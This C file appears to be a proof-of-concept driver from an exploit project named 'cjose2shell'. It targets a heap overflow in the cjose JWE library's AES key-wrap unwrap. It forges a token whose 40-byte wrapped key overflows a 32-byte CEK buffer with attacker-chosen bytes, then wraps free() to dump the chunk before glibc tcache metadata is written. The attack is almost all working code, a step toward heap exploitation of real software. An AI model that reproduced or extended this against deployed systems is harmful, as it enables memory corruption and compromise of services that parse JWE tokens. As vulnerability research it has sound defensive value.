/*
 * cjose2shell W196: does any attacker-chosen CEK byte survive to free()?
 *
 * Pinned jwe.c:72-83 _cjose_release_cek() memsets cek_len bytes before
 * free(). A vulnerable AES-KW unwrap sets cek_len to the unwrapped length,
 * so a 40-byte plaintext writes 40 chosen bytes into the 32-byte CEK and
 * then asks release to cleanse 40 bytes. This driver links --wrap=free and
 * dumps the CEK at free() entry, i.e. after the cleanse and before glibc
 * writes tcache next/key metadata into the chunk.
 *
 * Plain builds only. Real cjose_jwe_import/decrypt/release and real
 * OpenSSL RFC 3394 wrap/unwrap. No socket, listener, shell or credential.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <cjose/cjose.h>
#include <cjose/base64.h>
#include <cjose/error.h>
#include <openssl/aes.h>
#include "include/jwe_int.h"

static const char *JWK_OCT_16 = "{\"kty\":\"oct\", "
                                "\"k\":\"3921VrO5TrLvPQ-NFLlghQ\"}";
static const unsigned char KEK[16] = {
    0xdf, 0xdd, 0xb5, 0x56, 0xb3, 0xb9, 0x4e, 0xb2,
    0xef, 0x3d, 0x0f, 0x8d, 0x14, 0xb9, 0x60, 0x85
};

extern void __real_free(void *p);
static void *watch = NULL;

static void dump(const char *label, const unsigned char *p, size_t n)
{
    printf("%s ", label);
    for (size_t i = 0; i < n; i++) printf("%02x", p[i]);
    printf("\n");
}

void __wrap_free(void *p)
{
    if (p && p == watch) {
        printf("CEK_AT_FREE %p\n", p);
        dump("CEK_BYTES_AT_FREE", (const unsigned char *)p, 48);
        watch = NULL;
    }
    __real_free(p);
}

static char *wrap_blob(const unsigned char *pt, size_t pt_len)
{
    cjose_err err;
    memset(&err, 0, sizeof(err));
    unsigned char blob[1024];
    AES_KEY wkey;
    AES_set_encrypt_key(KEK, 128, &wkey);
    if (pt_len + 8 > sizeof(blob)) return NULL;
    if (AES_wrap_key(&wkey, NULL, blob, pt, pt_len) <= 0) return NULL;
    char *b64 = NULL;
    size_t b64_len = 0;
    if (!cjose_base64url_encode(blob, pt_len + 8, &b64, &b64_len, &err)) return NULL;
    return b64;
}

static char *tamper(const char *compact, char *b64)
{
    const char *d1 = strchr(compact, '.');
    const char *d2 = d1 ? strchr(d1 + 1, '.') : NULL;
    if (!d2) return NULL;
    size_t head = (size_t)(d1 - compact);
    size_t tail = strlen(d2);
    char *out = malloc(head + 1 + strlen(b64) + tail + 1);
    if (!out) return NULL;
    memcpy(out, compact, head);
    out[head] = '.';
    memcpy(out + head + 1, b64, strlen(b64));
    memcpy(out + head + 1 + strlen(b64), d2, tail);
    out[head + 1 + strlen(b64) + tail] = '\0';
    return out;
}

int main(int argc, char **argv)
{
    const char *scenario = (argc > 1) ? argv[1] : "attack";
    if (strcmp(scenario, "attack") && strcmp(scenario, "safe")) {
        printf("BAD_SCENARIO=%s\n", scenario);
        return 2;
    }
    setbuf(stdout, NULL);
    cjose_err err;
    memset(&err, 0, sizeof(err));

    cjose_jwk_t *jwk = cjose_jwk_import(JWK_OCT_16, strlen(JWK_OCT_16), &err);
    if (!jwk) { printf("JWK_FAIL=%d\n", err.code); return 2; }
    cjose_header_t *hdr = cjose_header_new(&err);
    cjose_header_set(hdr, CJOSE_HDR_ALG, CJOSE_HDR_ALG_A128KW, &err);
    cjose_header_set(hdr, CJOSE_HDR_ENC, CJOSE_HDR_ENC_A128CBC_HS256, &err);
    const char *plain = "Setec Astronomy";
    cjose_jwe_t *good = cjose_jwe_encrypt(jwk, hdr, (const uint8_t *)plain,
                                          strlen(plain), &err);
    char *compact = cjose_jwe_export(good, &err);
    if (!good || !compact) { printf("ENCRYPT_FAIL=%d\n", err.code); return 2; }
    char *token = compact;

    if (!strcmp(scenario, "attack")) {
        unsigned char pt[40];
        memset(pt, 0x5a, 32);
        memcpy(pt + 32, "MISHE-CL", 8);
        char *b64 = wrap_blob(pt, sizeof(pt));
        if (!b64) { printf("WRAP_FAIL\n"); return 2; }
        token = tamper(compact, b64);
        cjose_get_dealloc()(b64);
        if (!token) { printf("TAMPER_FAIL\n"); return 2; }
        printf("CHOSEN_TAIL=5a*32+MISHE-CL RAW_EK=48\n");
    } else {
        printf("CHOSEN_TAIL=none RAW_EK=40\n");
    }

    cjose_jwe_t *jwe = cjose_jwe_import(token, strlen(token), &err);
    if (!jwe) { printf("IMPORT_FAIL=%d\n", err.code); return 3; }
    size_t plain_len = 0;
    uint8_t *dec = cjose_jwe_decrypt(jwe, jwk, &plain_len, &err);
    printf("DECRYPT=%d ERRCODE=%d CEK=%p CEK_LEN_AFTER=%zu\n",
           dec != NULL, err.code, (void *)jwe->cek, jwe->cek_len);
    dump("CEK_BYTES_BEFORE_RELEASE", (const unsigned char *)jwe->cek, 48);

    watch = jwe->cek;
    cjose_jwe_release(jwe);          /* memset(cek, 0, cek_len) then free */
    printf("WATCH_CONSUMED=%d\n", watch == NULL);

    if (dec) cjose_get_dealloc()(dec);
    if (token != compact) free(token);
    cjose_get_dealloc()(compact);
    cjose_header_release(hdr);
    cjose_jwk_release(jwk);
    cjose_jwe_release(good);
    return 0;
}
